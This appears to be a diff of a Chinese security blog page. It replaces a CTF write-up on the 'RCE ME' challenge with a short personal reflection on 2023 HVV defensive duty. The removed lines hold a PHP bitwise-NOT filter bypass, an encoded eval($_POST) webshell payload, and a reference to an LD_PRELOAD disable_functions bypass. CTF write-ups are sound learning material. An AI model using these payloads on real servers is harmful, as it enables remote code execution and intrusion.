@@ -6,15 +6,12 @@
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>极客大挑战 2019 RCE ME - Αιώνιος</title>
+  <title>2023-hvv记录 - Αιώνιος</title>
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="google" content="notranslate" />
   
-  <meta name="description" content="
-GET传参
-strlen：长度不超过40
-preg_...">
+  <meta name="description" content="收获吧，认识了网安圈子真实的一群人，熟悉了告警设备天眼...">
   <meta name="author" content="4v1d">
   <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="16x16">
   <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="32x32">
@@ -156,7 +153,7 @@ preg_...">
       
       
     </div>
-    <div class="center">极客大挑战 2019 RCE ME</div>
+    <div class="center">2023-hvv记录</div>
     <div class="right">
       <i class="iconfont iconmenu j-navbar-menu"></i>
     </div>
@@ -198,51 +195,27 @@ preg_...">
       <div class="col-xl-6"><article class="article">
   <div class="wrap">
     <section class="head">
-  <img   class="lazyload" data-original="/images/life/sunrise.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <img   class="lazyload" data-original="/images/cover/nine.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
   <div class="head-mask">
-    <h1 class="head-title">极客大挑战 2019 RCE ME</h1>
+    <h1 class="head-title">2023-hvv记录</h1>
     <div class="head-info">
-      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 29, 2021</span>
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 04, 2023</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>941</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>296</span>
     </div>
   </div>
 </section>
     <section class="main">
       <section class="content">
         
-        <p><img   class="lazyload" data-original="/2021/09/29/2021/ctf/25/image-20210929213110592.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210929213110592"></p>
-<p>GET传参</p>
-<p>strlen：长度不超过40</p>
-<p>preg_match：匹配英文字母和数字，die NO</p>
-<p>满足条件就当做php执行并且不报错</p>
-<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yunqian2017/p/13308599.html">极客大挑战 2019]RCE ME - 云千 - 博客园 (cnblogs.com)</a></p>
-<p>参考：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">可以用异或或者取反绕过<br>异或绕过是指使用各种特殊字符的异或构造出字母和数字。取反绕过是对语句取反。<br></code></pre></td></tr></table></figure>
-
-<p>生成查询PHP info 的payload代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">echo</span> urlencode(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>即，对查询语句取反，然后编码。在编码前加上~进行取反，括号没有被过滤，不用取反。</p>
-<p>构造完的语句进行查询：</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">?code=(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br></code></pre></td></tr></table></figure>
-
-<p><img   class="lazyload" data-original="/2021/09/29/2021/ctf/25/image-20210929213713432.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210929213713432"></p>
-<p>看一些信息:</p>
-<p><img   class="lazyload" data-original="/2021/09/29/2021/ctf/25/image-20210929213849813.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210929213849813"></p>
-<p>禁用的函数相当的多</p>
-<p>先传木马连接</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>);<br>$a=<span class="hljs-string">&#x27;assert&#x27;</span>;<br>$b=urlencode(~$a);<br><span class="hljs-keyword">echo</span> $b;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>$c=<span class="hljs-string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;<br>$d=urlencode(~$c);<br><span class="hljs-keyword">echo</span> $d;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code=(~<span class="hljs-symbol">%9</span>E<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%8</span>D<span class="hljs-symbol">%8</span>B)(~<span class="hljs-symbol">%D7</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%89</span><span class="hljs-symbol">%9</span>E<span class="hljs-symbol">%93</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%DB</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%B0</span><span class="hljs-symbol">%AC</span><span class="hljs-symbol">%AB</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%92</span><span class="hljs-symbol">%90</span><span class="hljs-symbol">%9</span>C<span class="hljs-symbol">%97</span><span class="hljs-symbol">%8</span>A<span class="hljs-symbol">%C8</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%D6</span><span class="hljs-symbol">%D6</span>)<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure>
-
-<p><img   class="lazyload" data-original="/2021/09/29/2021/ctf/25/image-20210929214111148.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210929214111148"></p>
-<p>连上之后发现权限过低</p>
-<p><img   class="lazyload" data-original="/2021/09/29/2021/ctf/25/image-20210929214319688.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210929214319688"></p>
-<p>要读取flag，需要先执行readflag,但是因为禁用了很多函数，没有办法执行命令，这时候需要绕过disable_functions.方法好像很多，有的用蚁剑的插件，有的劫持共享so，也有一些工具<br>1.这里用工具<br>地址<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>由于在/var/tmp目录 有上传权限，可以上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php），</p>
-<p>2.蚁剑插件直接绕过</p>
-<p><img   class="lazyload" data-original="/2021/09/29/2021/ctf/25/image-20210929214454384.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210929214454384"></p>
-<p><img   class="lazyload" data-original="/2021/09/29/2021/ctf/25/image-20210929214557378.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210929214557378"></p>
+        <p>收获吧，认识了网安圈子真实的一群人，熟悉了告警设备天眼的使用。</p>
+<p>（当时真的写了好久的规则匹配进行过滤，不然真的好多误报，深信服的设备相对来说误报比较少，青藤云也不错）</p>
+<p>略思一会儿，觉得稍微写一点心得就好了，其他的略过~</p>
+<p>深圳这座城市节奏还是挺快的，物价也好贵啊~</p>
+<p>不过获得了微步社区的可乐还是挺惊喜的，嘿嘿，中奖了，难道真有诗人的天赋（哈哈还是算了</p>
+<p>说说自己的想法，hvv整个流程挺清晰的，对于行业的发展一定是积极向上的</p>
+<p>切莫让一些人不理智的行为使得网安行业令人误解</p>
+<p>暑假期间也是收获了两张证书，还是挺令人满意的，上交和上商的漏洞报送证书，很谢谢江夏师傅的栽培！算是实现了自己的一个小愿望。</p>
 
       </section>
       <section class="extra">
@@ -250,19 +223,19 @@ preg_...">
           <ul class="copyright">
   
     <li><strong>本文作者：</strong>4v1d</li>
-    <li><strong>本文链接：</strong><a href="http://daweitech.github.io/2021/09/29/2021/ctf/25/index.html" title="http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;09&#x2F;29&#x2F;2021&#x2F;ctf&#x2F;25&#x2F;index.html">http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;09&#x2F;29&#x2F;2021&#x2F;ctf&#x2F;25&#x2F;index.html</a></li>
+    <li><strong>本文链接：</strong><a href="http://daweitech.github.io/2023/09/04/2023/9/2023-hvv%E8%AE%B0%E5%BD%95/index.html" title="http:&#x2F;&#x2F;daweitech.github.io&#x2F;2023&#x2F;09&#x2F;04&#x2F;2023&#x2F;9&#x2F;2023-hvv%E8%AE%B0%E5%BD%95&#x2F;index.html">http:&#x2F;&#x2F;daweitech.github.io&#x2F;2023&#x2F;09&#x2F;04&#x2F;2023&#x2F;9&#x2F;2023-hvv%E8%AE%B0%E5%BD%95&#x2F;index.html</a></li>
     <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
   
 </ul>
         
         
         
-  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul> 
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/hvv/" rel="tag">hvv</a></li></ul> 
 
         
   <nav class="nav">
-    <a href="/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"><i class="iconfont iconleft"></i>2021鹤城杯</a>
-    <a href="/2021/09/28/2021/ctf/24/">MRCTF2020 wirteup<i class="iconfont iconright"></i></a>
+    <a></a>
+    <a href="/2023/06/08/2023/6/vue-2/">vue-2<i class="iconfont iconright"></i></a>
   </nav>
 
       </section>
